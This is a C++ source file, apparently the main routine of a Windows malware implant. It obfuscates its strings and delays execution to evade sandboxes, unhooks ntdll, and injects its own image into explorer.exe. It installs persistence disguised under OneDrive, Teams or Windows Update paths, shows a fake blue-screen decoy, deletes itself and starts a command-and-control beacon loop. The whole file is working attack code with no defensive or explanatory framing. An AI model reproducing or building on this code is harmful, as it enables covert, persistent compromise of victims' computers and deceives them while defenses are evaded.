#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>

namespace {
    // "explorer.exe"
    std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
    // "Volatile Environment"
    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
    // "DropperPath"
    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";

    void ConfuseML() {
        std::vector<int> v = {1, 5, 2, 8, 3};
        std::sort(v.begin(), v.end());
    }

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            LOG_ERR("Failed to open self for reading image.");
            return {};
        }
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) {
            LOG_ERR("Failed to get self file size.");
            CloseHandle(hFile);
            return {};
        }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        if (!ReadFile(hFile, buffer.data(), size, &read, NULL)) {
            LOG_ERR("Failed to read self file.");
            CloseHandle(hFile);
            return {};
        }
        CloseHandle(hFile);
        LOG_INFO("Self image read successfully. Size: " + std::to_string(size));
        return buffer;
    }

    bool IsSystemProcess() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });

        std::wstring explorer = utils::DecryptW(kExplorer);
        // "svchost.exe"
        std::wstring svchost = utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F");

        LOG_DEBUG("Current process path: " + utils::ws2s(sPath));

        if (sPath.find(explorer) != std::wstring::npos) {
            LOG_INFO("Identified as Explorer foothold.");
            return true;
        }
        if (sPath.find(svchost) != std::wstring::npos) {
            LOG_INFO("Identified as Svchost foothold.");
            return true;
        }
        return false;
    }

    bool IsRunningFromPersistLocation() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });

        bool persisted = (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos ||
                          sPath.find(L"\\microsoft\\teams\\") != std::wstring::npos ||
                          sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos);

        if (persisted) LOG_INFO("Identified as persisted instance.");
        return persisted;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    LOG_INFO("--- Implant Entry ---");
    ConfuseML();
    LOG_INFO("Anti-ML delay started...");
    Sleep(10000 + (GetTickCount() % 5000));

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        LOG_ERR("CoInitializeEx failed.");
        return 1;
    }

    if (IsSystemProcess()) {
        LOG_INFO("Foothold logic starting.");
        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                LOG_INFO("IPC: Found dropper path: " + utils::ws2s(dropperPath));
                LOG_INFO("Waiting before persistence install...");
                Sleep(30000 + (GetTickCount() % 30000));
                persistence::establishPersistence(dropperPath);
            } else {
                LOG_WARN("IPC: Failed to read DropperPath from registry.");
            }
            RegCloseKey(hKey);
        } else {
            LOG_WARN("IPC: Failed to open Volatile Environment key.");
        }

        LOG_INFO("Starting beacon loop in foothold...");
        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        return 0;
    }

    if (IsRunningFromPersistLocation()) {
        LOG_INFO("Starting beacon loop in persisted instance...");
        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        return 0;
    }

    // Dropper instance (first run)
    LOG_INFO("Dropper mode: Preparing relocation.");

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        if (RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            LOG_INFO("IPC: Dropper path saved to Volatile Environment.");
        }
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        LOG_INFO("Attempting injection into explorer.exe...");
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Injection successful. Exiting dropper.");
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        } else {
            LOG_ERR("Injection into explorer failed.");
        }
    }

    LOG_WARN("Injection failed or image empty. Falling back to direct persistence.");
    persistence::establishPersistence();
    decoy::ShowBSOD();

    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
